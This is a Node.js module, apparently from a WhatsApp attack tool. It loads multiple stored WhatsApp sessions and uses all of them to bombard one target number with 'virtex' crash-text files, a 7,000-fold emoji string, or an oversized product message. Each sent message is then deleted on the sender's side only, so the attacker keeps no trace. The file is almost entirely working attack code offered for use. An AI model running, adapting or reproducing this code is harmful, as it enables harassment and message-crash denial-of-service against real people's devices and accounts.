const fs = require("fs");
const path = require('path');

const {
    WAConnection,
    MessageType,
    Presence,
} = require("@adiwajshing/baileys");

// ==================================================

const config = require('../config');

// helpers
const {
    writeSession, listFileFromDir,
} = require("../helpers/fs");
const { createPromise } = require('../helpers/promise');
const formatter = require('../helpers/formatter');
const {
    color,
} = require("../helpers/color")

// ==================================================

async function addSession() {
    return new Promise(async function (resolve, reject) {
        const conn = new WAConnection();
        conn.connect(); // connect after declaration
        await conn.on('open', async () => {
            const {
                jid,
                name,
            } = conn.user;
            const new_name = String(jid).split("@")[0] + "---" + name
            await writeSession(new_name, conn.base64EncodedAuthInfo());
            setTimeout(async () => {
                await conn.close()
                setTimeout(async () => {
                    resolve(new_name)
                }, 1000);
            }, 2000);
        });
    });
}

async function checkActive(session_file) {
    return new Promise(async function (resolve, reject) {
        const conn = new WAConnection();
        conn.loadAuthInfo(path.join(config.session_path, session_file));
        conn.connect(); // connect after declaration
        await conn.on('open', async () => {
            setTimeout(async () => {
                await conn.close()
                setTimeout(async () => {
                    resolve(true)
                }, 1000);
            }, 2000);
        });
        await conn.on('close', async ({ reason, isReconnecting }) => {
            if (reason === "invalid_session") {
                await fs.unlinkSync(path.join(config.session_path, session_file))
                resolve(false)
            }
        });
    });
}
async function checkSessionActive(list) {
    const files = await fs.readdirSync(config.session_path);
    const active = [];
    const deleted = [];
    for (const session_file of files) {
        if (await checkActive(session_file)) {
            active.push(session_file)
        } else {
            deleted.push(session_file)
        }
    }
    await list({
        active,
        deleted,
        total: files.length,
    })
}

async function WhatsAppDevil(fix_target, session_file, payload, mode, virtex_array, onClose) {
    const conn = new WAConnection();
    conn.loadAuthInfo(path.join(config.session_path, session_file));
    conn.connect(); // connect after declaration
    conn.on('open', async () => {
        for (let a = 0; a < payload; a++) {
            if (mode === 1) {
                for (let o = 0; o < virtex_array.length; o++) {
                    const virtex = virtex_array[o]
                    const response = await conn.sendMessage(fix_target, virtex.content, MessageType.text);
                    console.log(
                        color(String(conn.user.jid).split("@")[0], "aquamarine"),
                        ":",
                        color(String(virtex.name).split("@")[0], "tomato"),
                        "~>",
                        color("[SEND]", "lime"),
                    );
                    conn.clearMessage(response.key) // will delete the sent message for only you!
                }
            } else if (mode === 2) {
                const response = await conn.sendMessage(fix_target, '🔥💝'.repeat(7e3), MessageType.text);
                console.log(
                    color(String(conn.user.jid).split("@")[0], "aquamarine"),
                    ":",
                    color(String("repeat-js").split("@")[0], "tomato"),
                    "~>",
                    color("[SEND]", "lime"),
                );
                await conn.clearMessage(response.key) // will delete the sent message for only you!
            } else if (mode === 3) {
                const imek = await conn.prepareMessage('0@s.whatsapp.net', fs.readFileSync(path.join(__dirname, "..", "media", "images", "slayer.jpeg")), MessageType.image);
                const smsg = await conn.prepareMessageFromContent(fix_target, {
                    productMessage: {
                        product: {
                            productImage: imek.message.imageMessage,
                            productImageCount: 1,
                            title: 'P34C3_KHYREIN™',
                            description: '🔥💝'.repeat(7e3),
                        },
                        businessOwnerJid: conn.user.jid,
                        // contextInfo: { mentionedJid: mem_id }
                    },
                }, {});
                await conn.relayWAMessage(smsg);
                console.log(
                    color(String(conn.user.jid).split("@")[0], "aquamarine"),
                    ":",
                    color(String("product").split("@")[0], "tomato"),
                    "~>",
                    color("[SEND]", "lime"),
                );
            }
        }
        //
        //
        //
        await setTimeout(async () => {
            await conn.close()
            onClose();
        }, 1000);
    });
}

async function WhatsAppExecute(target, payload, mode, onResult, onError = false) {
    const fix_target = formatter(target)
    await listFileFromDir(config.virtex_path, async virtex_file => {
        const virtex_array = [];
        if (mode === 1) { // prepare
            for (let i = 0; i < virtex_file.file.length; i++) { // per virtex
                const virtex_content = await fs.readFileSync(virtex_file.file[i], { encoding: "utf-8" });
                virtex_array.push({
                    name: virtex_file.file[i],
                    content: virtex_content,
                })
            }
        }


        const list_session = await fs.readdirSync(config.session_path)
        for (let i = 0; i < list_session.length; i++) {
            const session_file = list_session[i];
            WhatsAppDevil(fix_target, session_file, payload, mode, virtex_array, () => {
                if (i >= list_session.length - 1) {
                    onResult(list_session.length * (virtex_array > 0 ? virtex_array.length * payload : payload))
                }
            })
            console.log({ i });
        }





        // await createPromise(await fs.readdirSync(config.session_path), async (session_file, resolve, reject) => { // per session
        //     const conn = new WAConnection();
        //     conn.loadAuthInfo(path.join(config.session_path, session_file));
        //     conn.connect(); // connect after declaration
        //     await conn.on('open', async () => {
        //         for (let a = 0; a < payload; a++) {
        //             if (mode === 1) {
        //                 for (let o = 0; o < virtex_array.length; o++) {
        //                     const virtex = virtex_array[o]
        //                     const response = await conn.sendMessage(fix_target, virtex.content, MessageType.text);
        //                     console.log(
        //                         color(String(conn.user.jid).split("@")[0], "aquamarine"),
        //                         ":",
        //                         color(String(virtex.name).split("@")[0], "tomato"),
        //                         "~>",
        //                         color("[SEND]", "lime"),
        //                     );
        //                     conn.clearMessage(response.key) // will delete the sent message for only you!
        //                 }
        //             } else if (mode === 2) {
        //                 const response = await conn.sendMessage(fix_target, '🔥💝'.repeat(7e3), MessageType.text);
        //                 console.log(
        //                     color(String(conn.user.jid).split("@")[0], "aquamarine"),
        //                     ":",
        //                     color(String("repeat-js").split("@")[0], "tomato"),
        //                     "~>",
        //                     color("[SEND]", "lime"),
        //                 );
        //                 await conn.clearMessage(response.key) // will delete the sent message for only you!
        //             } else if (mode === 3) {
        //                 const imek = await conn.prepareMessage('0@s.whatsapp.net', fs.readFileSync(path.join(__dirname, "..", "media", "images", "slayer.jpeg")), MessageType.image);
        //                 const smsg = await conn.prepareMessageFromContent(fix_target, {
        //                     productMessage: {
        //                         product: {
        //                             productImage: imek.message.imageMessage,
        //                             productImageCount: 1,
        //                             title: 'P34C3_KHYREIN™',
        //                             description: '🔥💝'.repeat(7e3),
        //                         },
        //                         businessOwnerJid: conn.user.jid,
        //                         // contextInfo: { mentionedJid: mem_id }
        //                     },
        //                 }, {});
        //                 await conn.relayWAMessage(smsg);
        //             }
        //         }
        //         //
        //         //
        //         //
        //         await setTimeout(async () => {
        //             await conn.close()
        //             await setTimeout(async () => {
        //                 resolve(virtex_array > 0 ? virtex_array.length * payload : payload)
        //             }, 1000);
        //         }, 500);
        //     });
        // }, hasil => {
        //     onResult(hasil)
        // }, error => {
        //     if (onError) onError(error)
        // })
    })
}

module.exports = {
    addSession,
    checkSessionActive,

    WhatsAppExecute,
}